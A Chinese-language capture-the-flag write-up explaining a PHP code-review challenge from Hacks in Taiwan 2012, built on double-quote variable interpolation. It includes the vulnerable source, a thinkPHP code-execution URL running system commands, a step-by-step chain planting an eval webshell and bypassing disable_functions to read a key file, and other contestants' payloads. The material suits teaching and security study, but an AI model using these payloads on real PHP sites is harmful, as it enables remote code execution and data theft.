---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2012-07-hacks-in-taiwan-2012-web-hacking-1/
title: "Hacks in Taiwan 2012 Web Hacking 1 出題詳解 | Orange Tsai"
author: "Orange Tsai"
published: 2012-07-22T16:00:00.000Z
description: "簡單的 Code Review，所以只有 100 分 結束突然有點感嘆覺得說，台灣玩 Web Hacking 的人雖然多，但都不精，而且滿大比例是 …… 的orz 題目很簡單，Web Hacking 1 外國人題目一出來沒多久就解出來，基本上有在關注這一塊的人應該看到就可以馬上寫出解答! 題目是: Easy code review.This is a beginning of the web h"
---

* * *

簡單的 Code Review，所以只有 100 分

結束突然有點感嘆覺得說，台灣玩 Web Hacking 的人雖然多，但都不精，而且滿大比例是 …… 的orz

題目很簡單，Web Hacking 1 外國人題目一出來沒多久就解出來，基本上有在關注這一塊的人應該看到就可以馬上寫出解答!

題目是:

> Easy code review.
>
> This is a beginning of the web hacking.

都有 source code 了，再解不出來該去撞豆腐了XD

![](https://blog.orange.tw/posts/2012-07-hacks-in-taiwan-2012-web-hacking-1/35832e8ad56e62b6-01.jpg)

key.php 裡面放著過關金鑰

orange.html 是 orange.php 的原始碼

關卡的 PHP code 有提供 source 給大家 review，並從中找出漏洞進行利用，只有短短幾行

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>``` | ```<br><?php<br>    // by Orange@chroot.org, have fun.<br>    $data = $_GET["data"];<br>    $name = $_GET["name"];<br>    $arr = array("\"", "'", ";");<br>    $data = str_replace($arr, "", $data);<br>    $_ = <<< EOF<?php<br>    \$title = "$data";<br>?>EOF;<br>    $filename = sprintf("yourfiles/%s.config.php", $name);<br>    file_put_contents($filename, $_);`<br>``` |

Web Hacking 1 考的觀念是 PHP 中在雙引號中的變數是可以被解析的特性

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br><?php<br>    $test = 123;<br>    echo "$test";<br>``` |

這樣的結果會是 123，

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br><?php<br>    echo "{${phpinfo()}}";<br>``` |

這樣的結果會執行 phpinfo 這個 function

基本上這不算是一個漏洞，算是 PHP 的一個特性，但在 PHP Code Review 上卻是一個要注意的點

能利用的地方很多，例如在網站後台有功能可以寫設定檔，但是雙引號被 `magic_gpc_quote` 防禦時則可這樣利用，又或是舉個例子，有一套很火紅的 PHP framework 叫做 thinkPHP，之前被爆出 Code Execution 漏洞，出問題的點在於

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>$res = preg\_replace('@(w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));<br>``` |

> 轉自 [http://zone.wooyun.org/index.php?do=view&id=44](http://zone.wooyun.org/index.php?do=view&id=44)

雖然主要出問題的點在於 `preg_replace + e` 這個地方，但漏洞利用的觀念還是在於，在 `"\\2"` 中，變數會被放到雙引號中，所以可以利用這種網址

> /index.php?s=module/action/param1/${@system($\_GET\[cmd\])}
>
> &cmd=cat config.php

直接執行系統指令。

所以完整的利用流程只要三個網址就可以拿到 key 了

1. 產生 youtfiles/orange.config.php 檔案

> http://wg.hack.idv.tw/~ow100/orange.php?name=orange&data=${@eval($\_GET\[cmd\])}

2. 第二個步驟的主要目的觀看 php 設定是否有哪些防禦、限制

> http://wg.hack.idv.tw/~ow100/yourfiles/orange.config.php?cmd=phpinfo();

3. 繞過 `disable_function` 的限制，`disable_function` 的值有

> basename,chgrp,chmod,chown,clearstatcache,copy,delete,dirname,disk\_free\_space,disk\_total\_space,diskfreespace,fclose,feof,fflush,fgetc,fgetcsv,fgets,fgetss,file\_exists,file\_get\_contents,file,fileatime,filectime,filegroup,fileinode,filemtime,fileowner,fileperms,filesize,filetype,flock,fnmatch,fopen,fpassthru,fputcsv,fputs,fread,fscanf,fseek,fstat,ftell,ftruncate,fwrite,glob,is\_dir,is\_executable,is\_file,is\_link,is\_readable,is\_writable,is\_writeable,lchgrp,lchown,link,linkinfo,lstat,mkdir,parse\_ini\_file,parse\_ini\_string,pathinfo,pclose,popen,readfile,readlink,realpath\_cache\_get,realpath\_cache\_size,realpath,rename,rewind,rmdir,set\_file\_buffer,stat,symlink,tempnam,tmpfile,touch,umask,unlink,include,include\_once,require,requre\_once,opendir,readdir,highlight\_file,scandir

這裡我用的方法是用 `gzfile` ，並不在 `disable_function` 內，所以可以順利的讀取到 `key.php`

> http://wg.hack.idv.tw/~ow100/orange.config.php?cmd=print\_r(gzfile($\_GET\[b\]));&b=../key.php

![](https://blog.orange.tw/posts/2012-07-hacks-in-taiwan-2012-web-hacking-1/e85790f0c41d4839-02.jpg)

額外補充:

yourfiles 下共產生了 704 個 PHP 檔案，看其中內容有研究了一下還滿好玩的XD

除了完全與出題方向不同的 SQL injection, XSS 外有看到幾個比較有創意的答案

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br><?php $title = "{${show_source(trim(base64_decode(Li4va2V5LnBocCAK)))}}"; ?><br>``` |

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br><?$zip = new ZipArchive();echo $zip->open($_GET[(string)1],ZIPARCHIVE::OVERWRITE);echo $zip->addFile($_GET[(string)2]);$zip->close();?><br>``` |

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br><?php $title = "{${assert($_GET[1])}}"; ?><br>``` |